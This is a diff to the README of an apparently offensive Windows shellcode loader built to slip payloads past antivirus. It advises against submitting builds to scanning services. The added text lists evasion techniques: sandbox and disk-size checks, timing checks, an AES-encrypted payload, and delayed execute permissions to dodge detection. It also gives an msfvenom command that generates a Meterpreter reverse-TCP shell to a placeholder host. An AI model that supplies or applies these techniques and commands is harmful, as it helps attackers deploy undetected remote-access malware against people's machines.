@@ -20,7 +20,19 @@ Icon: https://icon-icons.com/icon/Halloween-eye/109170
 
 ! If you change the encryption method and want to keep your executable UD for a longer period of time, don't use VirusTotal / AntiScan.me / any other site that distributes to security vendors.
 
-## Build instructions
+## How does it work?
+1. Uses WINAPI WinMain so it doesn't popup any console window
+2. Checks the current hard disk, if the size is under 100GB it closes itself
+3. Sleeps for 10000ms (10s)
+4. Checks if any tickcount-related function was manipulated by a sandbox (by checking the hashes and comparing the time slept with the time elapsed on the machine), if something is wrong, it closes itself
+5. Stores the IV, the Key, and the payload as encrypted vectors
+6. Allocates a memory buffer for the payload
+7. Decrypts the payload (aes256) and closes itself if something doesn't work correctly
+8. Copies the payload to a new buffer
+9. Makes the new buffer as executable (This is not done during the first allocation because it's suspicious that a memory space is ReadWriteExecute at the same time and AVs may flag it!)
+10. Executes the payload with an infinite thread (when the shellcode sends an 'exit' command, the process will close)
+
+## How to build?
 **1. Generate a shellcode with metasploit<br>**
 - msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=*IP* LPORT=*PORT* -f raw > shellcode.bin
 
